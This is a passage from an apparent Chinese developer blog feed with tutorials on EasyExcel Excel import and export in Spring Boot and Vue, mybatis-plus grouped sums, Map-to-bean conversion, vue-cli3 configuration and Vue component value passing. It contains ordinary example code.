new QueryWrapper&lt;&gt;();</span><br><span class="line">        BidInforQueryWrapper.eq(&quot;project_name&quot;, subjectName);</span><br><span class="line">        BidInforQueryWrapper.eq(&quot;purchase_company&quot;, purchaseCompany);</span><br><span class="line">        BidInforQueryWrapper.eq(&quot;bid_company&quot;, bidCompany);</span><br><span class="line">        BidInfor bidInfor &#x3D; bidExcelService.getOne(BidInforQueryWrapper);</span><br><span class="line">        return bidInfor;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void doAfterAllAnalysed(AnalysisContext analysisContext) &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">@Service</span><br><span class="line">public class BidExcelServiceImpl extends ServiceImpl&lt;BidInforMapper, BidInfor&gt; implements BidExcelService &#123;</span><br><span class="line">    @Override</span><br><span class="line">    public void addSubject(MultipartFile file, BidExcelService bidExcelService) &#123;</span><br><span class="line">        &#x2F;&#x2F;文件输入流</span><br><span class="line">        InputStream in &#x3D; null;</span><br><span class="line">        try &#123;</span><br><span class="line">            in &#x3D; file.getInputStream();</span><br><span class="line">            &#x2F;&#x2F;调用方法进行读取,通过带参数的构造器将spring容器中的EduSubjectService对象传入到监听器中</span><br><span class="line">            EasyExcel.read(in, ExcelVo.class,new SubjectExcelListener(bidExcelService)).sheet().doRead();</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="前端代码"><a href="#前端代码" class="headerlink" title="前端代码"></a>前端代码</h4><p>Excel导入功能页面代码:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;el-row class&#x3D;&quot;home&quot; :gutter&#x3D;&quot;20&quot; style&#x3D;&quot;margin-top: 10px&quot;&gt;</span><br><span class="line">    &lt;el-col :span&#x3D;&quot;24&quot;&gt;</span><br><span class="line">      &lt;el-card shadow&#x3D;&quot;hover&quot;&gt;</span><br><span class="line">        &lt;el-upload</span><br><span class="line">          class&#x3D;&quot;upload-demo&quot;</span><br><span class="line">          action&#x3D;&quot;&quot;</span><br><span class="line">          :on-preview&#x3D;&quot;handlePreview&quot;</span><br><span class="line">          :on-remove&#x3D;&quot;handleRemove&quot;</span><br><span class="line">          :before-remove&#x3D;&quot;beforeRemove&quot;</span><br><span class="line">          :http-request&#x3D;&quot;uploadExcel&quot;</span><br><span class="line">          multiple</span><br><span class="line">          :limit&#x3D;&quot;1&quot;</span><br><span class="line">          :on-exceed&#x3D;&quot;handleExceed&quot;</span><br><span class="line">          :file-list&#x3D;&quot;fileList&quot;</span><br><span class="line">        &gt;</span><br><span class="line">          &lt;el-button size&#x3D;&quot;small&quot; type&#x3D;&quot;primary&quot;&gt;点击上传Excel&lt;&#x2F;el-button&gt;</span><br><span class="line">          &lt;div slot&#x3D;&quot;tip&quot; class&#x3D;&quot;el-upload__tip&quot;&gt;只能上传xlsx&#x2F;xls文件&lt;&#x2F;div&gt;</span><br><span class="line">        &lt;&#x2F;el-upload&gt;</span><br><span class="line">      &lt;&#x2F;el-card&gt;</span><br><span class="line">    &lt;&#x2F;el-col&gt;</span><br><span class="line">  &lt;&#x2F;el-row&gt;</span><br><span class="line">&lt;&#x2F;template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default &#123;</span><br><span class="line">  data() &#123;</span><br><span class="line">    return &#123;</span><br><span class="line">      fileList: []</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  methods: &#123;</span><br><span class="line">    handleRemove(file, fileList) &#123;</span><br><span class="line">      console.log(file, fileList)</span><br><span class="line">    &#125;,</span><br><span class="line">    handlePreview(file) &#123;</span><br><span class="line">      console.log(file)</span><br><span class="line">    &#125;,</span><br><span class="line">    handleExceed(files, fileList) &#123;</span><br><span class="line">      this.$message.warning(&#96;当前限制选择 1 个文件，本次选择了 $&#123;files.length&#125; 个文件，共选择了 $&#123;files.length + fileList.length&#125; 个文件&#96;);</span><br><span class="line">    &#125;,</span><br><span class="line">    &#x2F;&#x2F; eslint-disable-next-line no-unused-vars</span><br><span class="line">    beforeRemove(file, fileList) &#123;</span><br><span class="line">      return this.$confirm(&#96;确定移除 $&#123;file.name&#125;？&#96;)</span><br><span class="line">    &#125;,</span><br><span class="line">    uploadExcel(fileObj) &#123;</span><br><span class="line">      let formData &#x3D; new FormData()</span><br><span class="line">      formData.set(&#39;file&#39;, fileObj.file)</span><br><span class="line">      this.$axios</span><br><span class="line">        .post(&#39;&#x2F;excelData&#39;, formData, &#123;</span><br><span class="line">          headers: &#123;</span><br><span class="line">            &#39;Content-type&#39;: &#39;multipart&#x2F;form-data&#39;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">        .then()</span><br><span class="line">        .catch()</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style lang&#x3D;&quot;scss&quot; scoped&gt;&lt;&#x2F;style&gt;</span><br></pre></td></tr></table></figure><p>前端样式：<br> <img src="/img/easyexcel/excel.png" alt="错误"></p><h3 id="将数据库数据导出为excel并提供用户下载接口"><a href="#将数据库数据导出为excel并提供用户下载接口" class="headerlink" title="将数据库数据导出为excel并提供用户下载接口"></a>将数据库数据导出为excel并提供用户下载接口</h3><h4 id="后端代码-1"><a href="#后端代码-1" class="headerlink" title="后端代码"></a>后端代码</h4><p>接口代码:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;excel表录入添加数据</span><br><span class="line">   @PostMapping(&quot;&#x2F;excelData&quot;)</span><br><span class="line">   public DataResult addBidDataFromExcel (MultipartFile file) &#123;</span><br><span class="line">       bidExcelService.addSubject(file, bidExcelService);</span><br><span class="line">       return DataResult.success();</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   &#x2F;**</span><br><span class="line">    * 文件下载（失败了会返回一个有部分数据的Excel）</span><br><span class="line">    * &lt;p&gt;</span><br><span class="line">    * 1. 创建excel对应的实体对象 参照&#123;&#125;</span><br><span class="line">    * &lt;p&gt;</span><br><span class="line">    * 2. 设置返回的 参数</span><br><span class="line">    * &lt;p&gt;</span><br><span class="line">    * 3. 直接写，这里注意，finish的时候会自动关闭OutputStream,当然你外面再关闭流问题不大</span><br><span class="line">    *&#x2F;</span><br><span class="line">   @GetMapping(&quot;&#x2F;download&quot;)</span><br><span class="line">   public void download(HttpServletResponse response) throws IOException &#123;</span><br><span class="line">       &#x2F;&#x2F; 这里注意 有同学反应使用swagger 会导致各种问题，请直接用浏览器或者用postman</span><br><span class="line">       response.setContentType(&quot;application&#x2F;vnd.ms-excel&quot;);</span><br><span class="line">       response.setCharacterEncoding(&quot;utf-8&quot;);</span><br><span class="line">       &#x2F;&#x2F; 这里URLEncoder.encode可以防止中文乱码 当然和easyexcel没有关系</span><br><span class="line">       String fileName &#x3D; URLEncoder.encode(&quot;中标系统导出数据&quot;, &quot;UTF-8&quot;).replaceAll(&quot;\\+&quot;, &quot;%20&quot;);</span><br><span class="line">       response.setHeader(&quot;Content-disposition&quot;, &quot;attachment;filename*&#x3D;utf-8&#39;&#39;&quot; + fileName + &quot;.xlsx&quot;);</span><br><span class="line">       List&lt;BidInfor&gt; bidInforList &#x3D; bidExcelService.list(</span><br><span class="line">           Wrappers.&lt;BidInfor&gt;lambdaQuery().orderByDesc(BidInfor::getBidDate).select(BidInfor::getIndustry, BidInfor::getBidDate, BidInfor::getProvince,</span><br><span class="line">               BidInfor::getProjectName, BidInfor::getPurchaseWay,BidInfor::getPurchaseCompany, BidInfor::getDataSource, BidInfor::getBidCompany, BidInfor::getAmount, BidInfor::getNote,</span><br><span class="line">               BidInfor::getBusinessLabel, BidInfor::getTechnologyLabel, BidInfor::getCustomerLevel));</span><br><span class="line">       List&lt;DownloadDataVo&gt; downloadDataVoList &#x3D; new LinkedList&lt;&gt;();</span><br><span class="line">       for (BidInfor bidInfor : bidInforList) &#123;</span><br><span class="line">           downloadDataVoList.add(new DownloadDataVo(bidInfor.getIndustry(), bidInfor.getBidDate(), bidInfor.getProvince(), bidInfor.getProjectName(), bidInfor.getPurchaseWay(),</span><br><span class="line">               bidInfor.getPurchaseCompany(), bidInfor.getDataSource(), bidInfor.getBidCompany(), bidInfor.getAmount(), bidInfor.getNote(), bidInfor.getBusinessLabel(),</span><br><span class="line">               bidInfor.getTechnologyLabel(), bidInfor.getCustomerLevel()));</span><br><span class="line">       &#125;</span><br><span class="line">       EasyExcel.write(response.getOutputStream(), DownloadDataVo.class).sheet(&quot;中标系统导出数据&quot;).doWrite(downloadDataVoList);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h4 id="前端代码-1"><a href="#前端代码-1" class="headerlink" title="前端代码:"></a>前端代码:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;el-button type&#x3D;&quot;primary&quot; @click&#x3D;&quot;downloadExcel&quot;&gt;导出全部数据&lt;&#x2F;el-button&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> methods: &#123;</span><br><span class="line">downloadExcel() &#123;</span><br><span class="line">      window.open(&#39;http:&#x2F;&#x2F;localhost:8080&#x2F;api&#x2F;download&#39;)</span><br><span class="line">      &#x2F;&#x2F;location.href &#x3D; &#39;http:&#x2F;&#x2F;localhost:8080&#x2F;api&#x2F;download&#39;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="问题记录"><a href="#问题记录" class="headerlink" title="问题记录"></a>问题记录</h3><p>注意请勿使用以下代码发生请求下载</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">this.$axios</span><br><span class="line">     .get(&#39;&#x2F;download&#39;, &#123;&#125;)</span><br><span class="line">     .then()</span><br><span class="line">     .catch(error &#x3D;&gt; &#123;</span><br><span class="line">        console.log(error)</span><br><span class="line">    &#125;)</span><br></pre></td></tr></table></figure><p>将导致以下结果:<br> <img src="/img/easyexcel/excelDownload.png" alt="错误"></p><p>原因:发送Ajax请求后，后端响应的是二进制数据，jQuery的Ajax只能接收JSON等数据。</p><p>解决方案: </p><ul><li>1.在新的标签页请求接口，在请求接口上自己拼接参数</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function download() &#123;</span><br><span class="line">    window.open(&quot;&#x2F;download&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>2.创建一个form表单，提交表单的方式下载</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">function download() &#123;</span><br><span class="line">    var studentName &#x3D; 1;</span><br><span class="line">    var form &#x3D; document.createElement(&#39;form&#39;);</span><br><span class="line">    form.id &#x3D; &#39;form&#39;;</span><br><span class="line">    form.name &#x3D; &#39;form&#39;;</span><br><span class="line">    &#x2F;&#x2F;把这个form放在body里面</span><br><span class="line">    document.body.appendChild(form);</span><br><span class="line">    &#x2F;&#x2F;给form里面创建一个input框，隐藏掉，来存参数</span><br><span class="line">    var input &#x3D; document.createElement(&#39;input&#39;);</span><br><span class="line">    input.type &#x3D; &#39;hidden&#39;;</span><br><span class="line">    input.name &#x3D; &#39;studentName&#39;;</span><br><span class="line">    input.value &#x3D; studentName;</span><br><span class="line">    &#x2F;&#x2F;把input放在form里面</span><br><span class="line">    form.appendChild(input);</span><br><span class="line">    form.method &#x3D; &quot;GET&quot; &#x2F;&#x2F;请求方式</span><br><span class="line">    form.action &#x3D; &#39;&#x2F;download&#39;;</span><br><span class="line">    form.submit();</span><br><span class="line">    &#x2F;&#x2F;删掉form</span><br><span class="line">    document.body.removeChild(form)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> vue </category>
          
          <category> easyexcel </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vue </tag>
            
            <tag> easyexcel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mybatis-plus分组求和以及Map与Bean的转换</title>
      <link href="/2021/02/16/mybatis-plus%E5%88%86%E7%BB%84%E6%B1%82%E5%92%8C%E4%BB%A5%E5%8F%8AMap%E4%B8%8EBean%E7%9A%84%E8%BD%AC%E6%8D%A2/"/>
      <url>/2021/02/16/mybatis-plus%E5%88%86%E7%BB%84%E6%B1%82%E5%92%8C%E4%BB%A5%E5%8F%8AMap%E4%B8%8EBean%E7%9A%84%E8%BD%AC%E6%8D%A2/</url>
      
        <content type="html"><![CDATA[<h2 id="mybatis-plus分组求和"><a href="#mybatis-plus分组求和" class="headerlink" title="mybatis-plus分组求和"></a>mybatis-plus分组求和</h2><p>平常lambdaQuery写习惯了突然发现lambdaQuery好像不能求和，捡一下QueryWrapper写法<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">QueryWrapper&lt;Entity&gt; yearQueryWrapper = <span class="keyword">new</span> QueryWrapper&lt;&gt;();</span><br><span class="line">        yearQueryWrapper.select(<span class="string">"bid_year as name,sum(amount) as value"</span>);</span><br><span class="line">        yearQueryWrapper.groupBy(<span class="string">"bid_year"</span>).orderByAsc(<span class="string">"bid_year"</span>);</span><br><span class="line">        List&lt;Map&lt;String, Object&gt;&gt; yearMapList= bidInforService.listMaps(yearQueryWrapper);</span><br></pre></td></tr></table></figure></p><p>groupby多个字段<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 源码信息</span></span><br><span class="line">    <span class="function"><span class="keyword">default</span> Children <span class="title">groupBy</span><span class="params">(R... columns)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.groupBy(<span class="keyword">true</span>, columns);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">QueryWrapper.groupBy(<span class="string">"bid_year"</span>,<span class="string">"bid_month"</span>);</span><br></pre></td></tr></table></figure></p><h2 id="map与javaBean对象转换"><a href="#map与javaBean对象转换" class="headerlink" title="map与javaBean对象转换"></a>map与javaBean对象转换</h2><h3 id="方法一-用Apache-BeanUtils将Map转Bean"><a href="#方法一-用Apache-BeanUtils将Map转Bean" class="headerlink" title="方法一:用Apache BeanUtils将Map转Bean"></a>方法一:用Apache BeanUtils将Map转Bean</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 用apache的BeanUtils实现Map covert to Bean</span></span><br><span class="line">Map&lt;String,String&gt; map=<span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        User user=<span class="keyword">new</span> User();</span><br><span class="line">        map.put(<span class="string">"userName"</span>,<span class="string">"wang shisheng"</span>);</span><br><span class="line">        map.put(<span class="string">"passWord"</span>,<span class="string">"xxxxx44333"</span>);</span><br><span class="line"></span><br><span class="line">        BeanUtils.populate(user,map);</span><br></pre></td></tr></table></figure><h3 id="方法二-自封装工具类"><a href="#方法二-自封装工具类" class="headerlink" title="方法二:自封装工具类"></a>方法二:自封装工具类</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">public class MapToObjectUtil &#123;</span><br><span class="line">    public static &lt;T&gt; T map2Object(Map&lt;String, Object&gt; map, Class&lt;T&gt; clazz) &#123;</span><br><span class="line">        if (map &#x3D;&#x3D; null) &#123;</span><br><span class="line">            return null;</span><br><span class="line">        &#125;</span><br><span class="line">        T obj &#x3D; null;</span><br><span class="line">        try &#123;</span><br><span class="line">            obj &#x3D; clazz.newInstance();</span><br><span class="line"></span><br><span class="line">            Field[] fields &#x3D; obj.getClass().getDeclaredFields();</span><br><span class="line">            for (Field field : fields) &#123;</span><br><span class="line">                int mod &#x3D; field.getModifiers();</span><br><span class="line">                if (Modifier.isStatic(mod) || Modifier.isFinal(mod)) &#123;</span><br><span class="line">                    continue;</span><br><span class="line">                &#125;</span><br><span class="line">                field.setAccessible(true);</span><br><span class="line">                String filedTypeName &#x3D; field.getType().getName();</span><br><span class="line">                if (filedTypeName.equalsIgnoreCase(&quot;java.util.date&quot;)) &#123;</span><br><span class="line">                    String datetimestamp &#x3D; String.valueOf(map.get(field.getName()));</span><br><span class="line">                    if (datetimestamp.equalsIgnoreCase(&quot;null&quot;)) &#123;</span><br><span class="line">                        field.set(obj, null);</span><br><span class="line">                    &#125; else &#123;</span><br><span class="line">                        field.set(obj, new Date(Long.parseLong(datetimestamp)));</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    field.set(obj, map.get(field.getName()));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        return obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实战使用:<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">List&lt;Entity&gt; yearList = yearMapList.stream().map(item -&gt; MapToObjectUtil.map2Object(item, Entity<span class="class">.<span class="keyword">class</span>)).<span class="title">collect</span>(<span class="title">Collectors</span>.<span class="title">toList</span>())</span>;</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      <categories>
          
          <category> mybatis-plus </category>
          
          <category> map </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mybatis-plus </tag>
            
            <tag> map </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vue-cli3脚手架创建项目变化</title>
      <link href="/2021/01/16/vue-cli3%E8%84%9A%E6%89%8B%E6%9E%B6%E5%88%9B%E5%BB%BA%E9%A1%B9%E7%9B%AE%E5%8F%98%E5%8C%96/"/>
      <url>/2021/01/16/vue-cli3%E8%84%9A%E6%89%8B%E6%9E%B6%E5%88%9B%E5%BB%BA%E9%A1%B9%E7%9B%AE%E5%8F%98%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><p>一晃眼Vue都出到4了发现自己对Vue3和Vue2之间的变化还不清楚，因为实习工作的原因经常在Vue3和Vue2之间反复横跳，项目结构的变化让自己很难受，特此记录一下。</p><h2 id="项目结构对比"><a href="#项目结构对比" class="headerlink" title="项目结构对比"></a>项目结构对比</h2><p><img src="/img/vue/v-cli2和v-cl3项目结构对比.png" alt="v-cli2和v-cl3项目结构对比"></p><h3 id="vue-cli2"><a href="#vue-cli2" class="headerlink" title="vue cli2"></a>vue cli2</h3><p>build包: 配置webpack,图中base.conf.js、dev.conf.js、prod.conf.js分别为webpack基础配置、开发环境配置、生产环境配置</p><p>config包: 配置一些全局的配置</p><p>static: 存放静态文件</p><h3 id="vue-cli3"><a href="#vue-cli3" class="headerlink" title="vue cli3"></a>vue cli3</h3><p>vue cli3已集成大部分的webpack配置</p><p>若需要手动配置需手动在根目录新建一个vue.config.js<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// vue.config.js 常用配置</span></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;     </span><br><span class="line"><span class="comment">// 基本路径 vue.cli 3.3以前请使用baseUrl     </span></span><br><span class="line">publicPath: <span class="string">'/'</span>, </span><br><span class="line"><span class="comment">// 输出文件目录           </span></span><br><span class="line">outputDir: <span class="string">'dist'</span>,</span><br><span class="line"> <span class="comment">// 用于嵌套生产的静态资产(js, css, img, fonts)的目录</span></span><br><span class="line"> assetsDir: <span class="string">''</span>,     </span><br><span class="line"> <span class="comment">// 生产sourceMap     </span></span><br><span class="line"> productionSourceMap: <span class="literal">true</span>,    </span><br><span class="line"><span class="comment">// webpack配置     </span></span><br><span class="line">configureWebpack: <span class="function"><span class="params">()</span> =&gt;</span> &#123;&#125;,     </span><br><span class="line">chainWebpack: <span class="function"><span class="params">()</span> =&gt;</span> &#123;&#125;,     </span><br><span class="line"><span class="comment">// css相关配置     </span></span><br><span class="line">css: &#123;      </span><br><span class="line"><span class="comment">// 启用 modules      </span></span><br><span class="line">modules: <span class="literal">false</span>,      </span><br><span class="line"><span class="comment">// 是否使用css分离插件     </span></span><br><span class="line">extract: <span class="literal">true</span>,      </span><br><span class="line"><span class="comment">// 开启CSS source maps?      </span></span><br><span class="line">sourceMap: <span class="literal">false</span>,      </span><br><span class="line"><span class="comment">// css预设配置项      </span></span><br><span class="line">loaderOptions: &#123;&#125;,     </span><br><span class="line">&#125;,     </span><br><span class="line"><span class="comment">// webpack-dev-server 相关配置  </span></span><br><span class="line">devServer: &#123;      </span><br><span class="line">host: <span class="string">'0.0.0.0'</span>,      </span><br><span class="line">port: <span class="number">8080</span>,      </span><br><span class="line">proxy: &#123;&#125;, </span><br><span class="line"><span class="comment">// 设置代理    </span></span><br><span class="line">&#125;,     </span><br><span class="line"><span class="comment">// 第三方插件配置 </span></span><br><span class="line">pluginOptions: &#123;      </span><br><span class="line"><span class="comment">// ...     </span></span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      <categories>
          
          <category> vue </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vue </tag>
            
            <tag> vue-cli3 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vue的几种传值方式与demo代码</title>
      <link href="/2021/01/08/vue%E7%9A%84%E5%87%A0%E7%A7%8D%E4%BC%A0%E5%80%BC%E6%96%B9%E5%BC%8F%E4%B8%8Edemo%E4%BB%A3%E7%A0%81/"/>
      <url>/2021/01/08/vue%E7%9A%84%E5%87%A0%E7%A7%8D%E4%BC%A0%E5%80%BC%E6%96%B9%E5%BC%8F%E4%B8%8Edemo%E4%BB%A3%E7%A0%81/</url>
      
        <content type="html"><![CDATA[<h2 id="⽗⼦组件传值"><a href="#⽗⼦组件传值" class="headerlink" title="⽗⼦组件传值"></a>⽗⼦组件传值</h2><h2 id="几种传值方式"><a href="#几种传值方式" class="headerlink" title="几种传值方式"></a>几种传值方式</h2><ul><li>props / $emit<br>  ⼦组件中通过定义props接收⽗组件中通过v-bind绑定的数据<br>  ⽗组件中通过监听⼦组件中$emit的⾃定义事件接收数据</li><li>$parent / children<br>  ⼦组件中通过this.$parent这个对象获取⽗组件中的数据<br>  ⽗组件中通过this.$children这个数组获取⼦组件中的数据</li><li>$ref<br>  ⽗组件中定义⼦组件中的ref属性后，通过this.$refs.定义的属性名获取⼦组件数据</li></ul><h3 id="props-emit"><a href="#props-emit" class="headerlink" title="props / $emit"></a>props / $emit</h3><p>⼦组件中通过定义props接收⽗组件中通过v-bind绑定的数据<br>Parent.vue<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;h1&gt;Parent&lt;&#x2F;h1&gt;</span><br><span class="line">    &lt;my-child v-bind:msg&#x3D;&quot;&#39;form Parent msg&#39;&quot;&gt;&lt;&#x2F;my-child&gt;</span><br><span class="line">  &lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">import MyChild from &quot;.&#x2F;Child&quot;;</span><br><span class="line">export default &#123;</span><br><span class="line">  components: &#123;</span><br><span class="line">    MyChild</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style scoped&gt;</span><br><span class="line"></span><br><span 